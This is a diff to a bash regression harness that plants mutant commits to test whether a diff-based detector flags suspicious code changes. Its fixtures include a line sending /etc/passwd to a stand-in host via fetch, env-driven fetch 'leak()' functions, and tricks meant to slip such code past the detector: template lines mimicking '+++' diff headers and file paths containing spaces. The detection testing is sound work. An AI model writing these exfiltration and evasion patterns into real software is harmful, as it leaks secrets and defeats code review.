@@ -10,7 +10,7 @@
 #   `limb 1:` verdict line, never from a bare `(b1)` grep (Architect decision 2, G-3). A row compares the verdict and
 #   the Ruling 2 file list (`file@ends`); NOH also needs `adds nothing` whenever a `(b1) Ruling 2` line is printed.
 #   Each Ruling 2 file line is also printed whole (`R2 file`), with its `+` and `-` counts (ABC-188).
-# Limbs 2 and 3 of every plant but BIN-NUL and BIN-ATTR are compared byte for byte with the 341da4c1 instrument on the
+# Limbs 2 and 3 of every plant but BIN-NUL, BIN-ATTR and the five ABC-195 rows are compared byte for byte with the 341da4c1 instrument on the
 #   same plant. The script makes that copy itself: `git -C <repo> show 341da4c1:<instrument path>` into
 #   <scratch-dir>/r2-mutants-ref/, beside a node_modules/typescript symlink to the typescript that <clause-b.mjs>'s own
 #   directory resolves.
@@ -22,8 +22,8 @@
 # Each plant names the files it edits. `mk` refuses it (exit 2, naming the plant) unless `git diff --name-only` of the
 #   plant is exactly those files, so a plant that applies only in part never runs under its full label (QE-182-a).
 # Exit 0: every row as expected and limbs 2 and 3 identical. Exit 1: names each mismatched plant (limb 1) and each
-#   differing plant and limb (2, 3). Exit 2: usage, or a plant did not apply to <tip> exactly as named, or a route was
-#   left in the clone.
+#   differing plant and limb (2, 3). Exit 2: usage, or a plant did not apply to <tip> exactly as named, or a plant
+#   failed the plant check (ABC-195), or a route was left in the clone.
 # G1-IMP, G1-GRD, G1B, UNC1 and REN are deletion-only in a limb-1 holder (`AR-163-DELONLY`, closed by ABC-188): each
 #   FIRES on the instrument from ABC-188, and none fires on the one before it. BIN-NUL and BIN-ATTR each FIRE on the
 #   instrument from ABC-191 (its diff reads `--text --no-textconv`), and neither fires on the one before it.
@@ -37,6 +37,22 @@
 #   `--no-ext-diff --no-color --src-prefix=a/ --dst-prefix=b/`); on the one before it only ADD fires. `mk` reads names
 #   with core.quotePath=false. After the last row the script exits 2 if the clone still holds a color.* or diff.* key
 #   or a .git/info/attributes.
+# ABC-195 (AR-193-HUNKHDR, AR-193-SPACEPATH) adds five rows, 25 in all; plant bodies are Security/NFR's
+#   (.grugops/context/security-nfr-QE-193/probe/repro.sh). PP-TPL, PP-REDIR and RA-PLUS give src/fen.ts, above its
+#   `import { isSquareAttackedBy }`, a template literal holding one line that starts `++ ` (`++ promoted pieces`,
+#   `++ b/src/glyph-mode.ts`, `++ "quoted" note`), and at its end an exported leak() reading process.env.FEN_URL and
+#   calling fetch. PP-EDIT puts PP-TPL's template in src/cli.ts (a limb-2 holder) above its first function and edits
+#   its process.argv read in place far below. SP-N5 (two commits): base adds a benign `src/q t.ts` that src/cli.ts
+#   imports; head gives it a node:fs import, a process.env read and a fetch call. 341da4c1 is blind on all five, so
+#   each compares limbs 2 and 3 with 341da4c1 on the row's twin (mode TW): the same plant with that line's `++` as `x`,
+#   or, for SP-N5, the same two commits with src/q-t.ts, read back as `src/q t.ts` in the reference's output; the pair
+#   ids of the `  diff <base>..<head> = …` line are masked on both sides and nowhere else. On the instrument from
+#   ABC-195 (changedLines reads `---`/`+++` as headers only between `diff --git ` and the file's first `@@`, and drops
+#   one trailing TAB from an unquoted header path) all five FIRE on limb 2, and all but PP-EDIT on limb 3; on the one
+#   before it, limbs 2 and 3 do not fire on four of them and RA-PLUS fires only on a false C-quoted dispute. A plant
+#   check exits 2, naming the plant, unless the AR-193-HUNKHDR stand-in's awk prints at least one line on each plant's
+#   diff and none on its twin's, so a plant whose anchor drifts never runs as a silent control. The Ruling 2 file list
+#   splits a name at the two spaces before `(fired by Ruling 2:`, so a name holding a space reads whole.
 set -e
 [ $# -eq 4 ] && [ -f "$4" ] || { echo "usage: r2-mutants.sh <repo> <tip> <scratch-dir> <absolute path to clause-b.mjs>" >&2; exit 2; }
 REPO=$1; TIP=$2; mkdir -p "$3"; SC=$(cd "$3" && pwd); X=$SC/r2-mutants-clone; R=$SC/r2-mutants-ref; S=$4
@@ -59,6 +75,14 @@ ed() { perl -0pi -e "$2" "$1"; }   # one in-place edit; mk checks the plant's fi
 BAD=""; DIFF=""; XR=()
 # mask: the plant ids in the `diff <base>..<head> = …` line only (ABC-191).
 mask() { sed -E '/^  diff /s/\.\.[0-9a-f]+/..<plant>/g'; }
+# twmask (ABC-195): both pair ids in the `diff <base>..<head> = …` line only; a twin of SP-N5 has its own base too.
+twmask() { sed -E '/^  diff /s/[0-9a-f]+\.\.[0-9a-f]+/<base>..<plant>/g'; }
+# pc <plant> <base> <head> <twin base> <twin head> (ABC-195): exit 2, naming the plant, unless the AR-193-HUNKHDR
+#   stand-in's awk prints at least one line on the plant's diff and none on its twin's. PC keeps the two counts.
+hh() { git -c core.quotePath=false diff -U0 --no-renames --text --no-textconv --no-ext-diff --no-color --src-prefix=a/ --dst-prefix=b/ "$1" "$2" -- src |
+  awk '/^diff --git /{h=0} /^@@/{h=1} /^(\+\+\+|---) / && (h || /\t$/)' | wc -l | tr -d ' '; }
+pc() { local p t; p=$(hh "$2" "$3"); t=$(hh "$4" "$5"); PC="$p on the plant, $t on its twin"
+  [ "$p" -ge 1 ] && [ "$t" -eq 0 ] || { echo "plant $1 failed the plant check: stand-in lines $PC (want at least 1, and 0)" >&2; exit 2; }; }
 # rt <plant> <mode> on|off (ABC-193): with mode `route`, set the plant's git route (on) or remove every route (off).
 #   Only around the head instrument's runs; the routes live in this clone's .git or this shell's environment.
 NOP=$R/nop.sh; printf '#!/bin/sh\nexit 0\n' > "$NOP"; chmod +x "$NOP"; GA=$(git rev-parse --git-path info/attributes)
@@ -72,24 +96,28 @@ rt() { [ "$2" = route ] || return 0
     G-DRV) git config diff.ext.command "$NOP"; mkdir -p "$(dirname "$GA")"; printf 'src/** diff=ext\n' > "$GA";;
     G-PFX) git config diff.srcPrefix x/; git config diff.dstPrefix y/;;
   esac; }
-# row <plant> <base> <head> <expected verdict> <expected Ruling 2 files, or -> <note> [X1|route|QP]
+# row <plant> <base> <head> <expected verdict> <expected Ruling 2 files, or -> <note> [X1|route|QP|TW <tb> <th>]
 #   X1's row keeps 341da4c1's limbs 2 and 3 on X1, masked, in XR. With the last argument X1, limbs 2 and 3 are
 #   compared with that, masked, instead of with 341da4c1 on the same plant (BIN-NUL, BIN-ATTR). With `route`, the
 #   plant's route (named by the plant) is on for the head instrument's runs only. With `QP`, 341da4c1 runs with
-#   core.quotePath=false in its environment.
+#   core.quotePath=false in its environment. With `TW <tb> <th>` (ABC-195), 341da4c1 runs on the twin <tb>..<th>,
+#   src/q-t.ts read back as `src/q t.ts`, and both outputs are twmask'ed; the row also prints the plant check's counts.
 row() { local o v r2 fl got want l a b lo ro rn
   rt "$1" "${7:-}" on; o=$(node "$S" "$2" "$3" 1); rt "$1" "${7:-}" off
   v=$(grep -E '^  limb 1: ' <<<"$o" | sed 's/^  limb 1: //')
   r2=$(grep -F '  (b1) Ruling 2 ' <<<"$o" | sed 's/^[^:]*: //' || true)
   fl=$(awk '/^  \(b1\) Ruling 2 /{f=1;next} f&&/^      /{print;next} {f=0}' <<<"$o" |
-    sed -E 's/^ +([^ ]+) .*holds limb 1 at (.*)\)$/\1@\2/' | paste -sd ';' - || true)
+    sed -E 's/^ +(.*)  \(fired by Ruling 2: .*holds limb 1 at (.*)\)$/\1@\2/' | paste -sd ';' - || true)
   got="$v; R2 ${fl:--}"; want="$4; R2 $5"
   if [ "$got" = "$want" ] && { [ "$1" != NOH ] || [ -z "$r2" ] || [[ "$r2" == *"adds nothing" ]]; }; then a=ok; else a=MISMATCH; BAD="$BAD $1"; fi
   printf '%-7s %s..%s  %s\n        L1 expected  %s\n        L1 actual    %s   %s\n' "$1" "$2" "$3" "$6" "$want" "$got" "$a"
   printf '        (b1) capability: %s | (b1) Ruling 2: %s\n' "$(grep -F '  (b1) capability ' <<<"$o" | sed 's/.*: //')" "${r2:-(no such line)}"
   awk '/^  \(b1\) Ruling 2 /{f=1;next} f&&/^      /{sub(/^ +/,""); print "        R2 file      " $0; next} {f=0}' <<<"$o"
+  if [ "${7:-}" = TW ]; then printf '        plant check  stand-in lines: %s\n' "$PC"; fi
   for l in 2 3; do rt "$1" "${7:-}" on; lo=$(node "$S" "$2" "$3" $l); rt "$1" "${7:-}" off
     if [ "${7:-}" = X1 ]; then lo=$(mask <<<"$lo"); ro=${XR[$l]}; rn="$REF on X1, plant ids masked"
+    elif [ "${7:-}" = TW ]; then lo=$(twmask <<<"$lo"); rn="$REF on its twin, pair ids masked"
+      ro=$(node "$O" "$8" "$9" $l | twmask | sed 's#src/q-t\.ts#src/q t.ts#g')
     elif [ "${7:-}" = QP ]; then rn="$REF with core.quotePath=false in its environment"
       ro=$(GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.quotePath GIT_CONFIG_VALUE_0=false node "$O" "$2" "$3" $l)
     elif [ "${7:-}" = route ]; then ro=$(node "$O" "$2" "$3" $l); rn="$REF, route off"
@@ -164,9 +192,39 @@ printf 'export const q = () => 1;\n' > src/qé.ts; ed src/cli.ts 's|\A|import ".
 B=$(mk QE2-base src/cli.ts src/qé.ts)
 printf 'import { readFileSync } from "node:fs";\nexport const q = () => 1;\nexport const r = () => fetch("http://example.invalid/" + String(readFileSync("/etc/passwd")));\n' > src/qé.ts
 M=$(mk QE2 src/qé.ts); row QE2 $B $M FIRES "src/qé.ts@<head>" "reached src/qé.ts gains node:fs + fetch" QP; git reset -q --hard $T
+# PP-TPL, PP-REDIR, RA-PLUS (ABC-195, AR-193-HUNKHDR): pp <plant> <line> commits src/fen.ts with a template literal
+#   holding <line> above `import { isSquareAttackedBy }` and leak() (process.env.FEN_URL, fetch) at its end, then resets.
+#   Under -U0 the line prints as `+++ …` inside the file's first hunk; leak() is a later hunk.
+pp() { L=$2 perl -0pi -e 's/(\n\nimport \{ isSquareAttackedBy \})/\n\nexport const NOTE = `\n$ENV{L}\n`;\n$1/' src/fen.ts
+  printf '\nexport async function leak(): Promise<string> {\n  const u = process.env.FEN_URL ?? "";\n  return (await fetch(u)).text();\n}\n' >> src/fen.ts
+  mk "$1" src/fen.ts; git reset -q --hard $T; }
+M=$(pp PP-TPL '++ promoted pieces'); W=$(pp PP-TPL-twin 'x promoted pieces'); pc PP-TPL $T $M $T $W
+row PP-TPL $T $M "does not fire" "-" "src/fen.ts: template line '++ promoted pieces'; later hunk process.env + fetch" TW $T $W
+M=$(pp PP-REDIR '++ b/src/glyph-mode.ts'); W=$(pp PP-REDIR-twin 'x b/src/glyph-mode.ts'); pc PP-REDIR $T $M $T $W
+row PP-REDIR $T $M "does not fire" "-" "as PP-TPL, template line '++ b/src/glyph-mode.ts'" TW $T $W
+M=$(pp RA-PLUS '++ "quoted" note'); W=$(pp RA-PLUS-twin 'x "quoted" note'); pc RA-PLUS $T $M $T $W
+row RA-PLUS $T $M "does not fire" "-" "as PP-TPL, template line '++ \"quoted\" note'" TW $T $W
+# PP-EDIT (ABC-195, AR-193-HUNKHDR): src/cli.ts, a limb-2 holder, gets PP-TPL's template above its first function, and
+#   far below, its process.argv read is edited in place (slice(2) -> slice(1)).
+pe() { L=$2 perl -0pi -e 's/(\nfunction |\nexport function |\nasync function )/\nexport const NOTE = `\n$ENV{L}\n`;\n$1/; s/resolveOptions\(process\.argv\.slice\(2\)\)/resolveOptions(process.argv.slice(1))/' src/cli.ts
+  mk "$1" src/cli.ts; git reset -q --hard $T; }
+M=$(pe PP-EDIT '++ promoted pieces'); W=$(pe PP-EDIT-twin 'x promoted pieces'); pc PP-EDIT $T $M $T $W
+row PP-EDIT $T $M "does not fire" "-" "src/cli.ts: template line '++ promoted pieces'; argv read edited in place" TW $T $W
+# SP-N5 (ABC-195, AR-193-SPACEPATH; two commits): sp <plant> <file> commits a base where src/<file> is benign and
+#   src/cli.ts imports it, then a head where it gains node:fs, process.env and fetch; prints "<base> <head>", resets.
+#   git ends the `---`/`+++` headers of a name holding a space with a TAB. The twin is src/q-t.ts.
+sp() { printf 'export const q = 1;\n' > "src/$2"
+  F=./$2 perl -0pi -e 's/(\nimport )/\nimport { q as qq } from "$ENV{F}";\nvoid qq;$1/' src/cli.ts
+  local b; b=$(mk "$1-base" src/cli.ts "src/$2")
+  printf 'import { readFileSync } from "node:fs";\nexport const q = 1;\nexport const r = () => readFileSync(process.env.Q ?? "x", "utf8");\nexport const f = () => fetch("http://x");\n' > "src/$2"
+  echo "$b $(mk "$1" "src/$2")"; git reset -q --hard $T; }
+read -r B M <<<"$(sp SP-N5 'q t.ts')"; read -r WB W <<<"$(sp SP-N5-twin q-t.ts)"
+[ -n "$M" ] && [ -n "$W" ] || { echo "plant SP-N5 did not apply at $T" >&2; exit 2; }
+pc SP-N5 $B $M $WB $W
+row SP-N5 $B $M FIRES "src/q t.ts@<head>" "reached 'src/q t.ts' gains node:fs + process.env + fetch" TW $WB $W
 if git config --local --get-regexp '^(color|diff)\.' >/dev/null || [ -e "$GA" ]; then
   echo "r2-mutants: a route was left in the clone $X (a color.* or diff.* key, or $GA)" >&2; exit 2; fi
-[ -z "$BAD" ] && [ -z "$DIFF" ] && { echo "r2-mutants: 20 of 20 limb-1 rows as expected; limbs 2 and 3 identical to $REF on the same plant on 11 of 11, on the same plant with the route off on G-COLOR G-EXT G-ENV G-DRV G-PFX, with core.quotePath=false in its environment on QU and QE2, and on X1 (plant ids masked) on BIN-NUL and BIN-ATTR"; exit 0; }
+[ -z "$BAD" ] && [ -z "$DIFF" ] && { echo "r2-mutants: 25 of 25 limb-1 rows as expected; limbs 2 and 3 identical to $REF on the same plant on 11 of 11, on the same plant with the route off on G-COLOR G-EXT G-ENV G-DRV G-PFX, with core.quotePath=false in its environment on QU and QE2, on X1 (plant ids masked) on BIN-NUL and BIN-ATTR, and on its twin (pair ids masked) on PP-TPL PP-REDIR RA-PLUS PP-EDIT SP-N5"; exit 0; }
 [ -n "$BAD" ] && echo "r2-mutants: limb 1 MISMATCH:$BAD"
-[ -n "$DIFF" ] && echo "r2-mutants: limbs 2/3 DIFFER from $REF (on the same plant, route off on the route rows, core.quotePath=false on QU and QE2; on X1 for BIN-NUL and BIN-ATTR):$DIFF"
+[ -n "$DIFF" ] && echo "r2-mutants: limbs 2/3 DIFFER from $REF (on the same plant, route off on the route rows, core.quotePath=false on QU and QE2; on X1 for BIN-NUL and BIN-ATTR; on the twin for PP-TPL PP-REDIR RA-PLUS PP-EDIT SP-N5):$DIFF"
 exit 1
